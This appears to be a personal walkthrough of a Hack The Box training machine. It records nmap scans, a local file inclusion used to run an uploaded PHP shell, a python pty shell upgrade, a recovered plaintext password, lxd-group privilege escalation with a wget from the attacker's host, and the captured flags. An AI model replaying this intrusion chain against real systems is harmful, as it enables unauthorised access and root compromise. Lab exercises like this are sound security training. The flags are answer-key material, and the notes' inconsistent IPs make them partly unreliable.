# Connect to HTB
openvpn starting_point_MidnightKali.ovpn

# Spawn Machine

# Target machine IP address
10.129.95.185

# Export IP
export IP=10.129.95.185

# Check 
echo $IP

TASK 1

What service is running on the target machine over UDP?

# Run NMAP on UDP
sudo nmap -sU $IP -oN nmap-sU.txt
nmap -sV $IP -oN nmap-sV-IP

Nmap scan report for 10.129.217.95
Host is up (0.57s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
80/tcp open  http


Nmap scan report for 10.129.217.95
Host is up (0.29s latency).
Not shown: 998 closed ports
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
69/udp open|filtered tftp

tftp

TASK 2

What class of vulnerability is the webpage that is hosted on port 80 vulnerable to?

Local File Inclusion


TASK 3

What is the default system folder that TFTP uses to store files?

/var/lib/tftpboot/

TASK 4

Which interesting file is located in the web server folder and can be used for Lateral Movement?

curl 'http://$IP/?file=/var/lib/tftpboot/shell.php'

curl 'http://10.129.175.167/?file=/var/lib/tftpboot/shell.php'

curl 'http://10.129.176.101/?file=/var/lib/tftpboot/shells.php'


http://10.129.175.167/?file=home.php
# Better BASH using python3
python3 -c 'import pty;pty.spawn("/bin/bash")'



# Search around 
The web-related files are usually stored in the /var/www/html folder

cd /var/www/hml
cat .htpasswd

# Login to mike
su mike
Password: Sheffield19

TASK 4

Which interesting file is located in the web server folder and can be used for Lateral Movement?
.htpasswd

TASK 5

What is the group that user Mike is a part of and can be exploited for Privilege Escalation?

# Check unix groups
groups

lxd

TASK 6

When using an image to exploit a system via containers, we look for a very small distribution. Our favorite for this task is named after mountains. What is that distribution name?

Alpine (Image)

# Start a Python3 Web Server
python3 -m http.server 8000

wget http://192.168.1.138:9800/lxd.tar.xz

TASK 7

What flag do we set to the container so that it has root privileges on the host system?

security.privileged=true

TASK 8

If the root filesystem is mounted at /mnt in the container, where can the root flag be found on the container after the host system is mounted?

/mnt/root/

SUBMIT FLAG

Submit user flag

HTB{a56ef91d70cfbf2cdb8f454c006935a1}

SUBMIT FLAG

Submit root flag

HTB{c693d9c7499d9f572ee375d4c14c7bcf}